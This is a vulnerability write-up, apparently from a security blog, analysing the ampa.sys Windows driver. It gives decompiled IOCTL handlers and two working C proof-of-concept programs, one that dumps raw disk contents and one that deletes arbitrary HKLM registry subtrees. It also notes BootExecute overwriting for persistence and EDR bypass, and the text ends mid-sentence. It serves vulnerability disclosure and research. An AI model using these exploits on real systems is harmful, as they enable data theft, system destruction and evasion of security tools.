---
layout: post
title:  "Vulnerability Analysis - ampa.sys Driver - Privilege Escalation Vulnerabilities"
date:   2025-08-09 06:00:00 +0800
---

# Overview

**Vulnerability Type:** Privilege Escalation

**Sample:** [https://www.loldrivers.io/drivers/ea0e7351-b65c-4c5a-9863-83b9d5efcec3/](https://www.loldrivers.io/drivers/ea0e7351-b65c-4c5a-9863-83b9d5efcec3/)

**Quick Summary:** (From LOLDRIVERS) Northwave Cyber Security contributed this driver based on in-house research. The driver has a CVSSv3 score of 8.8, indicating a privilege escalation impact. This vulnerability could potentially be exploited for privilege escalation or other malicious activities.

**Unit42 PaloAlto Blog (March 14, 2025):** [https://unit42.paloaltonetworks.com/unusual-malware/](https://unit42.paloaltonetworks.com/unusual-malware/)

---

**Impact**: Capable to recursively delete arbitrary HKLM subtrees, overwrite `BootExecute` indicates persistence / destructive capability and reading disk and dump.

## Windows Driver - Devices and Symbolic links
There are three (3) device and symbolic links available in the driver. First device is use for GUI / Video that will call the `\\Device\wogui`. Second device, `\\Device\wowrt` use for disk passthrough and the third device is `\\Device\wowreg001`, use for registry stuff. 

## Dispatch Table Analysis
Our analysis focus on the dispatch table. The function `FUN_00011bbc` is `IRP_MJ_CREATE`. If the `(param_1 + 0x40)` equivalent to `2`, it calls the function `FUN_00011184` to resolve and open target disk device, e.g. stores in `FsContext2`. The `FUN_00011c7c` is `IRP_MJ_CLOSE`. This will cleans up the `FsContext / FsContext2`, stores `FileObject -> FsContext2` into `(v4 + 48)` then dereferences it.

Function `FUN_00011c3c` is `IRP_MJ_READ`. This is where disk read function will be call. If `(param_1 + 0x40)` are equals to `2` it calls `FUN_00011730`. Similar to disk read, disk write dispatch table entry are the `IRP_MJ_WRITE`. The most fun dispatch table are always the `IRP_MJ_DEVICE_CONTROL`. It is a low hanging fruit place to find bugs in any Windows drivers. `IRP_MJ_DEVICE_CONTROL` is the place for IOCTL resides at, the one that that we can send a request / connect to Kernel space. This works like an interface from one space to another (imagine watching Marvel's movie). In this driver, the `IRP_MJ_DEVICE_CONTROL` consists of three different functions, GUI IOCTL set, Disk read / write passthrough and Registry IOCTL set. 
```c
ulonglong entry(longlong param_1)
{
  undefined *puVar1;
  uint uVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  longlong local_res8;
  undefined8 local_28;
  undefined8 uStack32;
  undefined8 local_18;
  undefined8 uStack16;
  
  if (((DAT_00015100 == 0) || (DAT_00015100 == 0x2b992ddfa232)) &&
     (DAT_00015100 = (_DAT_fffff78000000320 ^ 0x15100) & 0xffffffffffff, DAT_00015100 == 0)) {
    DAT_00015100 = 0x2b992ddfa232;
  }
  DAT_00015108 = ~DAT_00015100;
  *(code **)(param_1 + 0x68) = FUN_00011cf8;
  *(code **)(param_1 + 0x70) = FUN_00011bbc;
  *(code **)(param_1 + 0x80) = FUN_00011c7c;
  *(code **)(param_1 + 0x90) = FUN_00011bfc;
  *(code **)(param_1 + 0x88) = FUN_00011c3c;
  *(code **)(param_1 + 0xe0) = FUN_00011d3c;
  RtlInitUnicodeString(&local_28,L"\\Device\\wogui");
  RtlInitUnicodeString(&local_18,L"\\DosDevices\\wogui");
  uVar2 = IoCreateDevice(param_1,0x38,&local_28,0x8080,0,0,&local_res8);
  if (-1 < (int)uVar2) {
    *(uint *)(local_res8 + 0x30) = *(uint *)(local_res8 + 0x30) | 4;
    puVar1 = *(undefined **)(local_res8 + 0x40);
    *puVar1 = 1;
    *(longlong *)(puVar1 + 8) = local_res8;
    *(undefined8 *)(puVar1 + 0x10) = local_28;
    *(undefined8 *)(puVar1 + 0x18) = uStack32;
    *(undefined8 *)(puVar1 + 0x20) = local_18;
    *(undefined8 *)(puVar1 + 0x28) = uStack16;
    uVar2 = IoCreateSymbolicLink(local_28,local_18,&local_18,&local_28);
    if ((int)uVar2 < 0) {
      IoDeleteDevice(local_res8);
    }
    else {
      uVar2 = 0;
    }
  }
  if ((int)uVar2 < 0) {
    uVar3 = (ulonglong)uVar2;
  }
  else {
    uVar3 = FUN_00011af4(param_1);
    if (-1 < (int)uVar3) {
      uVar4 = FUN_000124d4(param_1);
      uVar3 = 0;
      if ((int)uVar4 < 0) {
        uVar3 = uVar4 & 0xffffffff;
      }
    }
  }
  return uVar3;
}
```

## Quick Analysis of `IRP_MJ_DEVICE_CONTROL`
This part where all the IOCTLs resides at. The function `FUN_00011d9c` IOCTL ranges from `0x80800004` to `0x80800018`. The function does some reset and set the GUI display and this controllable via the IOCTL. Second function `FUN_00011894` looks like a passthrough, where a driver forwards the input output (I/O) to another driver in the device stack. This is quite complex to analyze as it required further understanding on how MiniFilter driver works. Third function `FUN_00012694` is the function that allows user to control the registry, by deleting or modifying registry under `HKLM` entry.

```c
ulonglong FUN_00011d3c(longlong param_1,longlong param_2)
{
  char cVar1;
  int iVar2;
  ulonglong uVar3;
  undefined4 extraout_var;
  
  cVar1 = **(char **)(param_1 + 0x40);
  if (cVar1 == '\x01') {
    uVar3 = FUN_00011d9c(param_1,param_2);      // set GUI
                                                // param_2 is user-controlled
  }
  else if (cVar1 == '\x02') {
    iVar2 = FUN_00011894(param_1,param_2);      // read disk 
    uVar3 = CONCAT44(extraout_var,iVar2);
  }
  else if (cVar1 == '\x03') {
    *(undefined8 *)(param_2 + 0x38) = 0;
    *(undefined4 *)(param_2 + 0x30) = 0xc0000010;
    IofCompleteRequest(param_2,0);
    uVar3 = 0;
  }
  else {
    uVar3 = FUN_00012694(param_1,param_2);      // set registry (delete, modify)
                                                // param_2 is user-controlled
  }
  return uVar3;
}
```

---

## Disk Device Analysis `FUN_00011184` & `FUN_00011730`: passThrough Handler - Disk Reading
Any user with the access to the driver allows to read and dump the disk. I have mention earlier that the `FUN_00011bbc` is the `IRP_MJ_CREATE`. Then it calls the `FUN_00011bbc`. It parses the `FileObject->FileName` such `\\Device\\DISK<idx>\\<suffix>` to extract disk number. It also attempts to locate matching `\\Device\\Harddisk<idx><suffix>` under `\\Driver\\Disk` by querying the object names. The function `FUN_00011078` builds `\\Device\\Harddisk<idx>\\Partition0`. All of the resolved device are stores to `*(lVar2 + 0x30)` and `FsContext2`, chases lower stack until matches driver named `Disk`.

The function `FUN_00011730` builds and issue `IoBuildAsynchronousFsdRequest(IRP_MJ_READ, ...)`; on success sets `Information = sectors << 9`.
```c
int FUN_00011730(longlong param_1,longlong param_2)
{
  int iVar1;
  longlong lVar2;
  longlong lVar3;
  int iVar4;
  longlong lVar5;
  undefined8 local_res8;
  ulonglong in_stack_ffffffffffffffa8;
  int local_48 [4];
  undefined local_38 [32];
  
  iVar4 = 0;
  *(undefined8 *)(param_2 + 0x38) = 0;
  lVar2 = *(longlong *)(param_1 + 0x40);
  lVar5 = *(longlong *)(param_2 + 0xb8);
  iVar1 = *(int *)(lVar5 + 8);
  if (iVar1 == 0) {
    *(undefined4 *)(param_2 + 0x30) = 0;
  }
  else {
    local_res8 = *(undefined8 *)(lVar5 + 0x18);
    *(undefined8 *)(lVar2 + 0x30) = *(undefined8 *)(*(longlong *)(lVar5 + 0x30) + 0x20);
    lVar5 = *(longlong *)(param_2 + 8);
    if ((*(byte *)(lVar5 + 10) & 5) == 0) {
      lVar5 = MmMapLockedPagesSpecifyCache
                        (lVar5,0,1,0,in_stack_ffffffffffffffa8 & 0xffffffff00000000,0x10);
    }
    else {
      lVar5 = *(longlong *)(lVar5 + 0x18);
    }
    if ((lVar5 == 0) || (*(longlong *)(lVar2 + 0x30) == 0)) {
      iVar4 = -0x3ffffff3;
    }
    else {
      lVar5 = IoBuildAsynchronousFsdRequest
                        (3,*(longlong *)(lVar2 + 0x30),lVar5,iVar1,&local_res8,local_48);
      if (lVar5 == 0) {
        iVar4 = -0x3fffff66;
      }
      else {
        KeInitializeEvent(local_38,0,0);
        lVar3 = *(longlong *)(lVar5 + 0xb8);
        *(code **)(lVar3 + -0x10) = FUN_0001168c;
        *(undefined *)(lVar3 + -0x45) = 0xe0;
        *(undefined **)(lVar3 + -8) = local_38;
        iVar4 = IofCallDriver(*(undefined8 *)(lVar2 + 0x30),lVar5);
        if (iVar4 == 0x103) {
          KeWaitForSingleObject(local_38,0,0,0,0);
          iVar4 = local_48[0];
        }
        if (iVar4 == 0) {
          *(ulonglong *)(param_2 + 0x38) = (ulonglong)(uint)(iVar1 << 9);
        }
      }
    }
    *(int *)(param_2 + 0x30) = iVar4;
  }
  IofCompleteRequest(param_2,0);
  return iVar4;
}
```


```c
undefined8 FUN_00011bbc(longlong param_1,longlong param_2)
{
  undefined8 uVar1;
  
  *(undefined8 *)(param_2 + 0x38) = 0;
  *(undefined4 *)(param_2 + 0x30) = 0;
  if ((**(char **)(param_1 + 0x40) == '\x01') || (**(char **)(param_1 + 0x40) != '\x02')) {
    IofCompleteRequest(param_2,0);
    uVar1 = 0;
  }
  else {
    uVar1 = FUN_00011184(param_1,param_2);
  }
  return uVar1;
}

// cut here //

void FUN_00011078(longlong param_1,uint param_2)
{
  longlong lVar1;

  // cut here //
  
  local_18 = DAT_00015100 ^ (ulonglong)auStack408;
  local_118 = L'\0';
  memset(local_116,0,0xfe);
  memcpy(local_158,L"\\Device\\Harddisk%d\\Partition0",0x3c);
  iVar2 = FUN_00011008(&local_118,0x100,local_158,(ulonglong)param_2);
  if (-1 < iVar2) {
    local_178 = 0;
    local_170 = 0;
    RtlInitUnicodeString(local_168,&local_118);
    iVar2 = IoGetDeviceObjectPointer(local_168,0,&local_170,&local_178);
    lVar1 = local_178;
    if (-1 < iVar2) {
      *(undefined8 *)(param_1 + 0x18) = local_170;
      local_178 = IoGetAttachedDeviceReference(local_178);
      if (local_178 != 0) {
        ObfDereferenceObject(lVar1);
      }
    }
  }
  FUN_00012810(local_18 ^ (ulonglong)auStack408);
  return;
}

// cut here //

void FUN_00011184(longlong param_1,longlong param_2)
{
  wchar_t wVar1;
  
  // cut here //
  
  local_38 = DAT_00015100 ^ (ulonglong)auStack840;
  *(undefined8 *)(param_2 + 0x38) = 0;
  lVar2 = *(longlong *)(param_1 + 0x40);
  *(undefined8 *)(lVar2 + 0x30) = 0;
  lVar3 = *(longlong *)(*(longlong *)(param_2 + 0xb8) + 0x30);
  uVar10 = 0;
  local_304 = 0;
  *(undefined8 *)(lVar3 + 0x20) = 0;
  *(undefined8 *)(lVar3 + 0x18) = 0;
  if (*(short *)(lVar3 + 0x58) != 0) {
    local_2b8 = L'\0';
    memset(local_2b6,0,0x3e);
    wcsncpy(&local_2b8,*(wchar_t **)(lVar3 + 0x60),(ulonglong)(*(ushort *)(lVar3 + 0x58) >> 1));
    uVar5 = 1;
    uVar9 = uVar5;
    do {
      iVar4 = (int)uVar9;
      if (local_2b6[uVar5 - 1] == L'\\') {
        local_278 = L'\0';
        local_2b6[(longlong)iVar4 + -1] = L'\0';
        memset(local_276,0,0x3e);
        wcsncpy(&local_278,local_2b6 + (longlong)(iVar4 + 1) + -1,(longlong)(0x1f - iVar4));
        uVar9 = 0xffffffffffffffff;
        pwVar11 = L"DISK";
        goto code_r0x0001129d;
      }
      uVar5 = uVar5 + 1;
      uVar9 = (ulonglong)(iVar4 + 1);
    } while ((longlong)uVar5 < 0x20);
    goto LAB_000112cb;
  }
LAB_000111df:
  uVar10 = 0xc000000d;
  goto LAB_000114dc;
  while( true ) {
    uVar9 = uVar9 - 1;
    wVar1 = *pwVar11;
    pwVar11 = pwVar11 + 1;
    if (wVar1 == L'\0') break;
code_r0x0001129d:
    if (uVar9 == 0) break;
  }
  RtlInitUnicodeString(&local_2f8,auStack634 + ~uVar9 * 2);
  RtlUnicodeStringToInteger(&local_2f8,10);
LAB_000112cb:
  RtlInitUnicodeString(local_2c8);
  local_2d0 = L"\\Driver\\Disk";
  local_310 = &local_300;
  local_318 = 0;
  local_320 = 0;
  local_328 = IoDriverObjectType_exref;
  local_300 = 0;
  local_2d8 = 0x18;
  local_2d6 = 0x1a;
  iVar4 = ObReferenceObjectByName(&local_2d8,0x40,0,0x1f01ff);
  if (iVar4 < 0) {
LAB_0001133d:
    lVar6 = FUN_00011078(lVar3,local_304);
    if (lVar6 == 0) goto LAB_000111df;
  }
  else {
    for (lVar8 = *(longlong *)(local_300 + 8); lVar6 = 0, lVar8 != 0;
        lVar8 = *(longlong *)(lVar8 + 0x10)) {
      local_308 = 0;
      ObQueryNameString(lVar8,0,0,&local_308);
      if (local_308 != 0) {
        uVar7 = ExAllocatePool(1,local_308);
        iVar4 = ObQueryNameString(lVar8,uVar7,local_308);
        if (-1 < iVar4) {
          local_238 = L'\0';
          memset(local_236,0,0x1fe);
          local_328 = local_2c0;
          FUN_00011008(&local_238,0x200,L"\\Device\\Harddisk%d%s",(ulonglong)local_304);
          RtlInitUnicodeString(&local_2f8,&local_238);
          iVar4 = RtlCompareUnicodeString(&local_2f8);
          if (iVar4 == 0) {
            ExFreePoolWithTag(uVar7);
            lVar6 = lVar8;
            break;
          }
          ExFreePoolWithTag();
        }
      }
    }
    ObfDereferenceObject(local_300);
    if (lVar6 == 0) goto LAB_0001133d;
  }
  *(longlong *)(lVar2 + 0x30) = lVar6;
  ObfReferenceObject(lVar6);
  lVar8 = *(longlong *)(lVar2 + 0x30);
  local_2e0 = L"Disk";
  local_2e8 = 8;
  local_2e6 = 10;
  while (lVar8 = IoGetLowerDeviceObject(lVar8), lVar8 != 0) {
    lVar6 = *(longlong *)(*(longlong *)(lVar8 + 8) + 0x30);
    local_2f8 = *(undefined8 *)(lVar6 + 0x18);
    uStack752 = *(undefined8 *)(lVar6 + 0x20);
    iVar4 = RtlCompareUnicodeString(local_2f8,&local_2e8,&local_2f8,1);
    if (iVar4 == 0) {
      ObfDereferenceObject(*(undefined8 *)(lVar2 + 0x30));
      *(longlong *)(lVar2 + 0x30) = lVar8;
      break;
    }
    ObfDereferenceObject(lVar8);
  }
LAB_000114dc:
  *(undefined8 *)(lVar3 + 0x20) = *(undefined8 *)(lVar2 + 0x30);
  *(undefined4 *)(param_2 + 0x30) = uVar10;
  IofCompleteRequest(param_2,0);
  FUN_00012810(local_38 ^ (ulonglong)auStack840);
  return;
}
```
### Proof of Concept - Disk Read & Dump
```c
#include <windows.h>
#include <winioctl.h>
#include <strsafe.h>
#include <stdio.h>

static void HelpMe() 
{
    wprintf(L"\nUsage: AmpaDiskDumper.exe -o <out_file>\n\n");
}

int wmain(int argc, wchar_t** argv) 
{
    const wchar_t* target = L"DISK0\\Partition0";
    const wchar_t* outPath = nullptr;
    ULONGLONG offset = 0;
    ULONGLONG length = 1ULL << 20;

    for (int i = 1; i < argc; ++i) 
    {
        if (_wcsicmp(argv[i], L"-o") == 0 && i + 1 < argc) 
        {
            outPath = argv[++i];
        }
        else 
        {
            HelpMe();
            return 1;
        }
    }

    if (!outPath) 
    { 
        HelpMe(); 
        return 1; 
    }

    wchar_t devicePath[MAX_PATH] = { 0 };
    HRESULT hr = StringCchPrintfW(devicePath, MAX_PATH, L"\\\\.\\wowrt\\%s", target);
    
    if (FAILED(hr)) 
    {
        wprintf(L"[-] Invalid\n");
        return 1; 
    }

    wprintf(L"\n[+] Trying to open device: %s\n", devicePath);

    HANDLE hDev = CreateFileW(devicePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hDev == INVALID_HANDLE_VALUE) 
    { 
        wprintf(L"[-] Unable to open device\n");
        return 2; 
    }

    LARGE_INTEGER li; li.QuadPart = (LONGLONG)offset;
    if (!SetFilePointerEx(hDev, li, nullptr, FILE_BEGIN)) 
    { 
        wprintf(L"[-] Failed to set position\n");
        CloseHandle(hDev); 
        return 3; 
    }

    wprintf(L"[+] Writing to file: %s\n", outPath);
    HANDLE hOut = CreateFileW(outPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hOut == INVALID_HANDLE_VALUE) 
    { 
        wprintf(L"[-] Failed to create file\n");
        CloseHandle(hDev); 
        return 4; 
    }

    const DWORD chunk = 1 << 20;
    BYTE* buffer = (BYTE*)VirtualAlloc(nullptr, chunk, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) 
    { 
        wprintf(L"[-] Failed to allocate\n");
        CloseHandle(hOut);
        CloseHandle(hDev); 
        return 5; 
    }

    ULONGLONG remaining = length;
    while (remaining > 0) 
    {
        DWORD toRead = (DWORD)((remaining > chunk) ? chunk : remaining);
        DWORD bytesRead = 0;
        BOOL ok = ReadFile(hDev, buffer, toRead, &bytesRead, nullptr);
        if (!ok)
        { 
            wprintf(L"[-] Failed to read disk\n"); 
            break;
        }
        
        if (bytesRead == 0) 
        { 
            wprintf(L"[!] Something wrong here. Zero bytes...\n"); 
            break; 
        }
        
        if (bytesRead > toRead) 
        { 
            bytesRead = toRead; 
        }

        DWORD bytesWritten = 0;
        ok = WriteFile(hOut, buffer, bytesRead, &bytesWritten, nullptr);
        if (!ok || bytesWritten != bytesRead)
        { 
            wprintf(L"[-] Failed to write output\n"); 
            break;
        }

        remaining -= bytesRead;
        if (bytesRead < toRead) 
        { 
            break; 
        }
    }

    VirtualFree(buffer, 0, MEM_RELEASE);
    CloseHandle(hOut);
    CloseHandle(hDev);

    wprintf(L"[+] You may want to view the dumped file on %s\n", outPath);

    return 0;
}
```
![Disk Read and Dump](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/disk_read.png)

---

## IOCTL 0x222000 Analysis: Arbitrary Registry Deletion - HKLM Registry
An arbitrary deletion under registry entry of `HKLM\\...` could be destructive, with the effect of change, system instability and persistence cleanup for attackers. The IOCTL 0x222000 attack path begins at function `FUN_000123c4`. It acquires and later releases a spinlock around list operations. Then follow by calling the function `FUN_00012098` to recursively enumerate subkeys using `ZwEnumerateKey` / `ZwQueryKey`, building full key paths and pushing each into the list via `FUN_00011f38`. Then it iterates the list, calling function `FUN_00011ff0` per node, `ZwOpenKey` then `ZwDeleteKey`. After that it will close the handle.
```c
void FUN_00012694(undefined8 param_1,longlong param_2)
{
  wchar_t wVar1;
  short sVar2;
  char *pcVar3;
  int iVar4;
  ulonglong uVar5;
  longlong lVar6;
  wchar_t *pwVar7;
  wchar_t *pwVar8;
  wchar_t *pwVar9;
  undefined auStack1080 [32];
  wchar_t local_418;
  undefined local_416 [1022];
  ulonglong local_18;
  
  local_18 = DAT_00015100 ^ (ulonglong)auStack1080;
  pcVar3 = *(char **)(param_2 + 0xb8);
  lVar6 = 0;
  iVar4 = 0;
  DAT_00015118 = &DAT_00015110;
  DAT_00015110 = &DAT_00015110;
  if (*pcVar3 == '\x0e') {
    if (*(int *)(pcVar3 + 0x18) == 0x222000) {      // ioctl
      local_418 = L'\0';
      memset(local_416,0,0x3fe);
      if ((*(int *)(pcVar3 + 0x10) != 0) &&
         (pwVar7 = *(wchar_t **)(param_2 + 0x18), pwVar7 != (wchar_t *)0x0)) {
        uVar5 = 0xffffffffffffffff;
        pwVar8 = pwVar7;
        do {
          if (uVar5 == 0) break;
          uVar5 = uVar5 - 1;
          wVar1 = *pwVar8;
          pwVar8 = pwVar8 + 1;
        } while (wVar1 != L'\0');
        if ((int)~uVar5 - 2U < 0x200) {
          do {
            sVar2 = *(short *)((longlong)L"\\Registry\\Machine" + lVar6);   // registry PATH
            *(short *)(local_416 + lVar6 + -2) = sVar2;
            lVar6 = lVar6 + 2;
          } while (sVar2 != 0);
          if (*pwVar7 != L'\\') {
            lVar6 = -1;
            pwVar8 = &local_418;
            do {
              pwVar9 = pwVar8;
              if (lVar6 == 0) break;
              lVar6 = lVar6 + -1;
              pwVar9 = pwVar8 + 1;
              wVar1 = *pwVar8;
              pwVar8 = pwVar9;
            } while (wVar1 != L'\0');
            *(undefined4 *)(pwVar9 + -1) = 0x5c;
          }
          wcsncat(&local_418,pwVar7,~uVar5 - 1 & 0xffffffff);
          uVar5 = FUN_000123c4(&local_418,(ulonglong)pwVar7);   // we can set input PATH
          iVar4 = (int)uVar5;
          goto LAB_000127be;
        }
      }
    }

    // cut here //
 
 }

    // cut here //
}

// cut here // 
// Function FUN_000123c4, input parameter for Registry path
ulonglong FUN_000123c4(short *param_1,ulonglong param_2)
{
  undefined8 *puVar1;
  undefined8 *puVar2;
  byte bVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  undefined8 *puVar6;
  ulonglong uVar7;
  
  bVar3 = KeAcquireSpinLockRaiseToDpc(&DAT_00015120);
  uVar5 = 0;
  puVar6 = DAT_00015110;
  if ((undefined8 **)DAT_00015110 != &DAT_00015110) {
    do {
      DAT_00015110 = (undefined8 *)*puVar6;
      param_2 = 0;
      DAT_00015110[1] = &DAT_00015110;
      ExFreePoolWithTag(puVar6,0);
      puVar6 = DAT_00015110;
    } while ((undefined8 **)DAT_00015110 != &DAT_00015110);
  }
  uVar4 = FUN_00012098(param_1);    // PATH parameter, user controlled
  uVar7 = uVar4 & 0xffffffff;
  if (-1 < (int)uVar4) {
    FUN_00011f38(&DAT_00015110,param_1);
    while (puVar6 = DAT_00015110, (undefined8 **)DAT_00015110 != &DAT_00015110) {
      puVar2 = (undefined8 *)*DAT_00015110;
      puVar1 = DAT_00015110 + 2;
      DAT_00015110 = puVar2;
      puVar2[1] = &DAT_00015110;
      uVar5 = FUN_00011ff0(puVar1);     // iterates list
      uVar5 = uVar5 & 0xffffffff;
      ExFreePoolWithTag(puVar6,0);
    }
    param_2 = 0;
    uVar7 = uVar5;
  }
  KeReleaseSpinLock(&DAT_00015120,param_2 & 0xffffffffffffff00 | (ulonglong)bVar3);
  return uVar7;
}

// cut here // 
// Function FUN_00012098 is the PATH parameter
ulonglong FUN_00012098(short *param_1)
{
  wchar_t wVar1;
  ushort uVar2;
  short sVar3;
  uint uVar4;
  ulonglong uVar5;
  void *_Dst;
  wchar_t *_Dest;
  longlong lVar6;
  wchar_t *pwVar7;
  wchar_t *pwVar8;
  short *psVar9;
  uint local_res18 [2];
  uint local_res20;
  uint *puVar10;
  undefined8 local_98;
  uint local_90;
  void *local_88;
  wchar_t *local_80;
  wchar_t *local_70;
  undefined4 local_68 [2];
  undefined8 local_60;
  undefined *local_58;
  undefined4 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined local_38 [24];
  
  if (param_1 == (short *)0x0) {
    uVar5 = 1;
  }
  else {
    RtlInitUnicodeString(local_38,param_1);
    local_58 = local_38;
    local_68[0] = 0x30;
    local_60 = 0;
    local_50 = 0x40;
    local_48 = 0;
    local_40 = 0;
    uVar5 = ZwOpenKey(&local_98,0xf003f,local_68);
    if (-1 < (int)uVar5) {
      uVar4 = ZwQueryKey(local_98,2,0,0,local_res18);
      uVar5 = (ulonglong)uVar4;
      if (local_res18[0] == 0) {
        ZwClose(local_98);
      }
      else {
        _Dst = (void *)ExAllocatePoolWithTag(1);
        memset(_Dst,0,(ulonglong)local_res18[0]);
        puVar10 = local_res18;
        local_res20 = ZwQueryKey(local_98,2,_Dst,local_res18[0],puVar10);
        if (local_res18[0] != 0) {
          _Dest = (wchar_t *)ExAllocatePoolWithTag(1,0x1000,0x4d594d4d);
          local_90 = 0;
          local_80 = _Dest;
          if (*(int *)((longlong)_Dst + 0x14) != 0) {
            do {
              puVar10 = (uint *)((ulonglong)puVar10 & 0xffffffff00000000);
              local_res20 = ZwEnumerateKey(local_98,local_90,0,0,puVar10,local_res18);
              if (local_res18[0] != 0) {
                local_88 = (void *)ExAllocatePoolWithTag(1);
                memset(local_88,0,(ulonglong)local_res18[0]);
                puVar10 = (uint *)((ulonglong)puVar10 & 0xffffffff00000000 |
                                  (ulonglong)local_res18[0]);
                local_res20 = ZwEnumerateKey(local_98,local_90,0,local_88,puVar10,local_res18);
                uVar2 = *(ushort *)((longlong)local_88 + 0xc);
                local_70 = (wchar_t *)((longlong)local_88 + 0x10);
                if (uVar2 == 0) {
                  ExFreePoolWithTag();
                }
                else {
                  memset(_Dest,0,0x1000);
                  psVar9 = param_1;
                  do {
                    sVar3 = *psVar9;
                    *(short *)(((longlong)_Dest - (longlong)param_1) + (longlong)psVar9) = sVar3;
                    psVar9 = psVar9 + 1;
                  } while (sVar3 != 0);
                  lVar6 = -1;
                  pwVar7 = _Dest;
                  do {
                    pwVar8 = pwVar7;
                    if (lVar6 == 0) break;
                    lVar6 = lVar6 + -1;
                    pwVar8 = pwVar7 + 1;
                    wVar1 = *pwVar7;
                    pwVar7 = pwVar8;
                  } while (wVar1 != L'\0');
                  *(undefined4 *)(pwVar8 + -1) = 0x5c;
                  wcsncat(_Dest,local_70,(ulonglong)(uVar2 >> 1));
                  uVar5 = FUN_00012098(_Dest);
                  local_res20 = (uint)uVar5;
                  if (-1 < (int)local_res20) {
                    FUN_00011f38(&DAT_00015110,_Dest);
                  }
                  ExFreePoolWithTag();
                }
              }
              local_90 = local_90 + 1;
            } while (local_90 < *(uint *)((longlong)_Dst + 0x14));
          }
          ExFreePoolWithTag(local_80,0);
        }
        ExFreePoolWithTag(_Dst,0);
        ZwClose(local_98);
        uVar5 = (ulonglong)local_res20;
      }
    }
  }
  return uVar5;
}
```

### IOCTL 0x222000 Proof-of-Concept - Arbitrary Registry Deletion (HKLM)
```c
#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <tchar.h>

// 0x222000
#ifndef IOCTL_WOWREG_DELETE
#define IOCTL_WOWREG_DELETE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#endif

// to test this, create a registry entry under HKLM
static const wchar_t* kDefaultSuffix = L"SOFTWARE\\AmpaDriver\\test";

int wmain(int argc, wchar_t** argv)
{
    const wchar_t* suffix = kDefaultSuffix;

    HANDLE h = CreateFileW(L"\\\\.\\wowreg", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE)
    {
        wprintf(L"[-] Unable to open wowreg handle");
        return 1;
    }

    const size_t inBytes = (wcslen(suffix) + 1) * sizeof(wchar_t);
    DWORD bytesReturned = 0;

    wprintf(L"[+] Using IOCTL 0x%08X to delete HKLM\\%s ...\n", IOCTL_WOWREG_DELETE, suffix);

    BOOL ok = DeviceIoControl(h, IOCTL_WOWREG_DELETE, (LPVOID)suffix, (DWORD)inBytes, nullptr, 0, &bytesReturned, nullptr);
    if (!ok)
    {
        wprintf(L"[-] Unable to execute IOCTL_WOWREG_DELETE. Probably device permission issue?\n");
        CloseHandle(h);
        return 2;
    }

    wprintf(L"[+] Successfully deleted the HKLM registry. Please verify...\n");
    CloseHandle(h);

    return 0;
}
```
![HKLM Registry Delete](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/delete_reg.png)

---

## IOCTL 0x22200C Analysis: Arbitrary Registry BootExecute Modification  
An arbitrary registry modification under registry entry of `HKLM\\...` could lead to code execution, with the effect of change, system instability and persistence in the target system for attackers. The IOCTL 0x22200C allows user to trigger the IOCTL and modify the `BootExecute` registry by using the hard-coded value. This ignores the caller-provided data and use the writes hard-coded `test\n` value, using the registry type `REG_MULTI_SZ`. The function `FUN_00012584` initialize the hard-coded registry entry, `\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Session Manager` with `BootExecute` and then call the `ZwOpenKey`. Assuming if `iVar1` is `1` (which mean has input), then it will call the `ZwSetValueKey` to set the new `BootExecute` entry (in other words, we overwrite the current existing `autocheck autochk *` entry, all Windows has this by default).

```c
ulonglong entry(longlong param_1)
{
  undefined *puVar1;
  uint uVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  longlong local_res8;
  undefined8 local_28;
  undefined8 uStack32;
  undefined8 local_18;
  undefined8 uStack16

  // cut here //

  else if (*(int *)(pcVar3 + 0x18) == 0x22200c) {
        uVar5 = 0xffffffffffffffff;
        pwVar7 = L"test\n";
        do {
          if (uVar5 == 0) break;
          uVar5 = uVar5 - 1;
          wVar1 = *pwVar7;
          pwVar7 = pwVar7 + 1;
        } while (wVar1 != L'\0');
        iVar4 = FUN_00012584(&DAT_00013040,L"test\n",~uVar5 - 1);
        goto LAB_000127be;
      }
      iVar4 = -0x3ffffdce;
    }
  LAB_000127be:
    *(int *)(param_2 + 0x30) = iVar4;
    IofCompleteRequest(param_2,0);
    FUN_00012810(local_18 ^ (ulonglong)auStack1080);
    return;
  }

  // cut here //
}

// cut here //
// Overwrite registry entry of BootExecute
int FUN_00012584(undefined8 param_1,undefined8 param_2,ulonglong param_3)
{
  int iVar1;
  undefined8 local_res20;
  undefined local_58 [16];
  undefined local_48 [16];
  undefined4 local_38 [2];
  undefined8 local_30;
  undefined *local_28;
  undefined4 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  local_res20 = 0;
  RtlInitUnicodeString
            (local_58,L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Session Manager");
  RtlInitUnicodeString(local_48,L"BootExecute");
  local_28 = local_58;
  local_38[0] = 0x30;
  local_30 = 0;
  local_20 = 0x40;
  local_18 = 0;
  local_10 = 0;
  iVar1 = ZwOpenKey(&local_res20,0xf003f,local_38);
  if (iVar1 < 0) {
    iVar1 = 0;
  }
  else {
    ZwSetValueKey(local_res20,local_48,0,7,L"test\n",(int)((param_3 & 0xffffffff) >> 1));
    iVar1 = ZwFlushKey(local_res20);
    if (iVar1 < 0) {
      iVar1 = 1;
    }
    ZwClose(local_res20);
  }
  return iVar1;
}
```


### IOCTL 0x22200C Proof-of-Concept - Arbitrary Registry Modification (BootExecute)
I came across a proof of concept by @rad9800 related to `BootExecute`. He / She has properly documented the way to bypass EDR utilizing the `BootExecute`. This is what he wrote:
```
